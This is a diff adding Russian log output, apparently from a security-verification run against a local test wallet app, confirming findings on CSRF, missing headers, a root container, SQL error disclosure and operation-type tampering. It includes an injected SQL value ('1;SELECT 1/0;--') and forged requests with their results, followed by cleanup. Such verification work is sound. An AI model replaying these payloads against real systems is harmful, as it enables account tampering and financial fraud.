+    ┌─ АРТЕФАКТ · OW-40 · чужой Origin изменил профиль
+    │ Origin=https://attacker.invalid, POST /profile без CSRF token → HTTP 200
+    │ users.display_name|email: Иван Иванов|ivanov@office.local → OW40-CSRF|ivanov@x.local
+    └─
+[+] сервер принял state-changing POST без CSRF-защиты
+    → SQL UPDATE users SET display_name='Иван Иванов', email='ivanov@office.local' WHERE login='ivanov'
+    ← psql UPDATE 1
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-41
+################################################################################################
+== OW-41 · ответ HTML не содержит базовые security headers ==
+    → GET / для проверки заголовков
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-41 · заголовки ответа
+    │ GET / → HTTP 200
+    │ проверялись: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options
+    │ отсутствуют: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options
+    └─
+[+] ответ не задаёт ожидаемые security headers
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-42
+################################################################################################
+== OW-42 · контейнер приложения запущен от root ==
+    ┌─ АРТЕФАКТ · OW-42 · UID процесса контейнера
+    │ docker exec office-wallet-main-app-1 id -u → exit=0 stdout=0 stderr=(пусто)
+    └─
+[+] приложение работает с UID 0
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-43
+################################################################################################
+== OW-43 · ответ пользователю раскрывает ошибку PostgreSQL ==
+    → POST /transfer/new amount_rub='1;SELECT 1/0;--'
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    ┌─ АРТЕФАКТ · OW-43 · сообщение БД попало в HTML
+    │ POST /transfer/new → HTTP 200
+    │ ответ содержит диагностический текст: pq: division by zero | SELECT 1;SELECT 1/0;--::bigint
+    └─
+[+] клиенту возвращена подробная ошибка SQL/драйвера
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-44
+################################################################################################
+== OW-44 · op_type из POST переопределяет тип transfer_draft ==
+    → POST /transfer/new recipient=petrova amount=1 memo=OW44
+    ← HTTP 302 redirect=http://localhost:18081/transfer/confirm?draft_id=36  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение перевода · Office Wallet</title>   <link rel="preconnect" href="https://fonts.go...
+    → SQL SELECT op_type FROM transfer_drafts WHERE id=36
+    ← psql transfer
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194188900
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 922300
+    → POST /transfer/confirm draft_id=36 op_type=tip_boss
+    ← HTTP 302 redirect=http://localhost:18081/operations/594  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Операция · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    → SQL SELECT id||'|'||kind||'|'||amount_kop||'|'||memo FROM operations WHERE memo='OW-44' ORDER BY id DESC LIMIT 1
+    ← psql 594|tip_boss|100|OW-44
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 194188800
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 922400
+    ┌─ АРТЕФАКТ · OW-44 · POST заменил вид операции
+    │ transfer_drafts.op_type перед подтверждением: transfer
+    │ POST op_type=tip_boss → HTTP 200; operation row=594|tip_boss|100|OW-44
+    │ balances ivanov 194188900→194188800; petrova 922300→922400
+    └─
+[+] операция записана как tip_boss хотя draft был transfer
+    → SQL DELETE FROM operations WHERE id=594
+    ← psql DELETE 1
+    → SQL UPDATE users SET balance_kop=194188900 WHERE login='ivanov'
+    ← psql UPDATE 1
+    → SQL UPDATE users SET balance_kop=922300 WHERE login='petrova'
+    ← psql UPDATE 1
+    OW-44: тестовая операция удалена, балансы восстановлены
